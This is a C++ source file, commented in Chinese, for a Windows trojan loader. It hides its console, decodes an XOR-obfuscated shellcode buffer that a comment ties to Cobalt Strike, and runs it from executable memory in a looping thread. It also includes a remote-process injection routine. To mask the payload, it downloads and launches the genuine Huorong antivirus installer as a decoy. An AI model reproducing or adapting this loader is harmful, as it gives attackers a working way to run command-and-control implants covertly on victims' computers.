#pragma comment( linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"" )
//不显示cmd窗口

#include <iostream>
#include <Windows.h>
#include <string>
#include <Urlmon.h>
#include <windows.h>
#include <tchar.h>
#include <shlobj.h>

#pragma comment(lib, "shell32.lib") 
#pragma comment(lib,"ws2_32.lib")
#pragma comment(lib, "Urlmon.lib")

#define passcode 2000
#define BUF_SIZE 1024
#define SleepTime 1000

using namespace std;

//被加密后的shellcode
unsigned char buf[] = "";

DWORD WINAPI ShellThread(LPVOID lp) {
	LPVOID Memory;
	unsigned char deShellCode[10000];				//为解密的shellcode开一个char数组，10000应该够大了，如果是1000的话CS的shellcode装不下
	while (true)  //只要线程还在，，就会持续尝试连接服务器
	{
		try
		{
			//解密shellcode
			memset(deShellCode, 0, sizeof(deShellCode));    //函数内部开的数组全是藏内存，初始化一下
			int nLen = sizeof(buf) - 1;						
			for (int i = 0; i < nLen; i++)					
			{
				if ((i % 2) == 0) deShellCode[i] = (buf[i] ^ passcode);
				else deShellCode[i] = (buf[i] - passcode);
			}

			Memory = VirtualAlloc(NULL, sizeof deShellCode, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE); 
			memcpy(Memory, deShellCode, sizeof deShellCode);  
			((void(*)()) Memory)(); 
		}
		catch (const std::exception&) //如果连接失败
		{
			Sleep(SleepTime); //稍等一会重新连接
			((void(*)()) Memory)(); 
		}
	}
	return 0;
}

BOOL InjectShellCode(int Pid)
{
	HANDLE Handle, remoteThread;
	PVOID remoteBuffer;

	Handle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, Pid);

	remoteBuffer = VirtualAllocEx(Handle, NULL, sizeof(buf), (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
	WriteProcessMemory(Handle, remoteBuffer, buf, sizeof(buf), NULL);
	remoteThread = CreateRemoteThread(Handle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
	CloseHandle(Handle);
}

int main()
{
	CreateThread(NULL, NULL, ShellThread, NULL, NULL, NULL);

	//下载火绒
	string url = "http://down5.huorong.cn/sysdiag-full-5.0.66.3-2022.4.2.2.exe";
	size_t len = url.length();//获取字符串长度
	int nmlen = MultiByteToWideChar(CP_ACP, 0, url.c_str(), len + 1, NULL, 0);//如果函数运行成功，并且cchWideChar为零，
	wchar_t* buffer = new wchar_t[nmlen];
	MultiByteToWideChar(CP_ACP, 0, url.c_str(), len + 1, buffer, nmlen);

	TCHAR rongPath[MAX_PATH];
	SHGetSpecialFolderPath(0, rongPath, CSIDL_COMMON_DOCUMENTS, 0); //获取当前用户文档路径
	lstrcat(rongPath, _T("\\Huorong.exe"));
	HRESULT hr = URLDownloadToFile(NULL, buffer, rongPath, 0, NULL);

	TCHAR commandLine[] = TEXT("C:\\Users\\Public\\Documents\\Huorong.exe");
	ShellExecute(NULL, L"open", commandLine, L"", L"", SW_SHOW);

	//主线程休眠，防止主线程退出导致子线程也退出
	while (true)
	{
		Sleep(100000000);
	}
}
